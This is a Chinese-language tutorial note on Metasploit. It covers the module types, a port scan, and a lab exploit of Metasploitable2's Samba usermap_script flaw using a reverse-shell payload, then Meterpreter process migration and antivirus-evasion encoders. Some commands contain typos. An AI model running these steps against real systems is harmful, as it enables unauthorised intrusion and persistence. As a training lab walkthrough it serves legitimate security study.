# Metasploit模块
1. Auxiliaries 辅助模块
负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。
2. Exploit 漏洞利用模块
利用一个系统、应用或服务中的安全漏洞进行的攻击行为。
3. Payload 攻击载荷模块
成功渗透目标后，用于在目标系统上运行任意命令或者特定代码，在Metasploit框架中可以自由选择、传送和植入。
4. Post 后期渗透模块
主要负责获取到目标系统远程控制权限后，进行一系列的后渗透攻击动作。
5. Encoders 编码工具模块
负责在渗透测试中负责免杀，防止被安全设备或软件识别出来。
# 渗透攻击步骤
1. 扫描目标机系统，寻找可用漏洞
2. 选择并配置一个漏洞利用模块
3. 选择并配置一个攻击载荷模块
4. 选择一个编码即使，用来绕过杀毒软件的查杀
5. 渗透攻击

## 一、使用辅助模块进行端口扫描
     1.msfconsole
     2.search portscan
     3.use auxiliary/scanner/portscan/tcp
     4.show options
     5.set RHOST 169.254.170.249
     6.set PORTS 1-65535
     7.set THREADS 10
     8.show options
     9.run
## 常用的扫描模块及功能
p193
## 二、漏洞利用
  
     实验下载地址：https://sourceforge.net/projects/metasploitable/files/Metasploitable2
     默认的登录名和密码是msfadmin：msfadmin
1. 收集目标机的信息

        namp -Sv 192.168.101.135
        发现Samba 3.x服务
2. 搜索漏洞利用模块
     
       search samba
       返回的利用列表是根据利用难度来整理的
4. 查看漏洞详细信息

       可以查看漏洞利用模块信息
       info exploit/multi/samba/usermap_script
5. 漏洞模块利用

       use exploit/multi/samba/usermap_script
       命令行由msf>变成msf5 exploit(multi/samba/usermap_script) > 
6. 查看漏洞利用模块下可供的攻击载荷模块

       show payloads
7. 选择一个攻击载荷进行攻击

        这里选择cmd/unix/revers反向攻击载荷模块
        set PAYLOAD cmd/unix/reverse
8. 设置攻击主机IP地址

      set RHOST 192.168.101.135
        
9. 设置漏洞利用端口

      set PRORT 445
10. 设置发动攻击主机ip地址

      set LHOST 192.168.101.131
11. 输入攻击命令

      exploit或者run

## 四、进程迁移
刚获取Meterpreter Shell时，该Shell是脆弱的。例如，攻击者可以利用浏览器漏洞攻陷目标机器，但攻击渗透后浏览器有可能被用户关闭，所有第一步要移动这个shell，把它和目标机中的一个文档进程绑定在一起，也不需要对磁盘进行任何写入操作，使得更安全
1. 查看目标机正在运行的进程

       meterpreter > ps
       ps命令获取目标主机正在运行的进程

2. 查看Meterpreter Shell的进程号

       meterpreter > getpid
       获取Meterpreter shell的pid进程号
4. 迁移进程号

       meterpreter > migrate 448(要迁移到的进程号)
    进程迁移后原先的PID会自动关闭，如果没有关闭则可以使用kill 984(需要关闭的进程号)。

    同样也可以使用自动迁移进程命令

        run post/windows/manage/migrate
     系统会自动寻早合适的进程然后迁移
